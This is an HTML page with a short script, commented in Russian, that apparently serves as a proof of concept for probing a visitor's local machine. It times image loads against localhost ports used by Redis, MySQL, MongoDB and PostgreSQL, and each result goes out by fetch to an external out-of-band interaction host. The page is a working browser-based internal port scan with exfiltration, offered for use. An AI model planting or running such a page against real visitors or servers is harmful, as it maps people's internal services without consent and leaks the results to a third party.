<!DOCTYPE html>
<html>
<body>
    <script>
        const hook = "https://zmsfeowzqscjsayavbfe5bypi9ion50ff.oast.fun";

        function probe(port) {
            const url = "http://127.0.0.1";
            const start = Date.now();
            const img = new Image();
            
            // Устанавливаем таймаут, чтобы не ждать вечно
            const timer = setTimeout(() => {
                img.src = ""; // Прекращаем загрузку
                record(port, "timeout", Date.now() - start);
            }, 2000);

            img.onerror = () => {
                clearTimeout(timer);
                const duration = Date.now() - start;
                record(port, "error", duration);
            };

            img.onload = () => {
                clearTimeout(timer);
                record(port, "open", Date.now() - start);
            };
            
            img.src = `${url}:${port}/favicon.ico?v=${start}`;
        }

        function record(port, status, time) {
            console.log(`Port ${port}: ${status} in ${time}ms`);
            // Используем fetch вместо sendBeacon для надежности при тестах
            fetch(`${hook}/?port=${port}&status=${status}&time=${time}`, {mode: 'no-cors'});
        }

        // Запуск
        [6379, 3306, 27017, 5432, 8089797878970].forEach(probe);
    </script>
</body>
</html>
